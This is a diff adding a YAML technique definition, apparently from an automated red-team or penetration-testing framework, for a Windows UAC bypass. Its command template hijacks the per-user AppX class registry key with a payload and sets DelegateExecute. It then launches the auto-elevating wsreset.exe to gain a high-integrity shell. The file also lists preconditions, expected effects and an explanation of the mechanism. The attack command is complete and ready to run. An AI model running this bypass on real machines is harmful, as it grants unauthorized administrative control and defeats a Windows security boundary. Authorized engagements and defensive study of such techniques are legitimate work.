@@ -1,0 +1,32 @@
+name: uac_bypass_wsreset
+category: privesc
+description: UAC bypass — wsreset.exe auto-elevates, executes AppX registry command
+preconditions:
+- shell_obtained
+- uac_enabled
+- is_local_admin
+parameters:
+  payload: from_engagement.uac_payload
+command_template: reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+  /t REG_SZ /d "{payload}" /f && reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+  /v DelegateExecute /t REG_SZ /f && wsreset.exe
+parser: generic_parser
+expected_effects:
+- uac_bypassed
+- high_integrity_shell
+falsifier:
+  pattern: not elevated|integrity=Medium|patched|AppX removed
+  timeout: 30
+model_tier: haiku
+mechanism: 'wsreset.exe has autoElevate=true and invokes the AppX UWP store reset
+  handler.
+
+  Hijacking the per-user HKCU AppX class registration causes the elevated process
+
+  to execute the attacker''s command. Same anatomy as fodhelper, different binary.
+
+  '
+references:
+  ocd_mindmap: 'Branch 11: UAC bypass (wsreset)'
+  hacktricks: windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.md
+hacktricks_ref: windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.md
